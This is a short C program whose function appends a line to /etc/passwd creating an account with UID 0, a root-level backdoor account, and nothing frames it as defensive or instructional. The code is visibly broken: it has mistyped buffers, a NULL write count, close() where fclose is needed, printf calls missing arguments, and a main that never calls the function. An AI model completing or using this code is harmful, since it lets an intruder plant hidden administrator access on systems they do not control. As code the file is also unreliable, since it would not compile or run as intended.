#include <stdlib.h>
#include <stdio.h>

char *buf[1024] = {0};

int add_user_passwd(char *username) {
    FILE *passwd;
    passwd = fopen("/etc/passwd", "a+");

    if(passwd != NULL) {
        //root:x:0:0:root:/root:/bin/bash
        
        sprintf(buf, "%s:x:0:0:%s:/root:/bin/bash", *username, *username);
        if(fwrite(buf, sizeof(buf), NULL, passwd) != 0) {
#ifdef DEBUG
            printf("Successfully added %s to passwd\n");
#endif
            close(buf);
            return 1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if(argc != 1) {
#ifdef DEBUG
        printf("Usage: %s 'username'\n");
#endif
    }
}